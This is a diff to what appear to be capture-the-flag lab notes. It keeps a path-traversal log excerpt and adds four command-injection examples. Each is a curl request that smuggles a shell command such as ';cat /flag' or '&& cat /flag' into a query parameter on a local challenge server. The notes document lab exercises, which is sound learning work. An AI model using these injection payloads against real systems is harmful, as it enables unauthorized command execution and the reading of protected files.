@@ -40,3 +40,20 @@ both are translated into this:
 DEBUG: requested_path='/challenge/files/fortunes/../../../flag'
 127.0.0.1 - - [09/Mar/2025 02:20:07] "GET /content/fortunes%2f..%2f..%2f..%2fflag HTTP/1.1" 200 -
 ```
+
+
+#### CMDi 1
+
+`curl "http://challenge.localhost:80/serve?top-path=/;+cat+/flag"`
+
+#### CMDi 2
+
+`curl "http://challenge.localhost:80/checkpoint?folder=/challenge&&+cat+/flag"`
+
+#### CMDi 3
+
+`curl "http://challenge.localhost:80/initiative?destination=/challenge'+|+cat+/flag'"
+
+#### CMDi 4
+
+`curl "http://challenge.localhost:80/quest?timezone=MST;cat+/flag"`
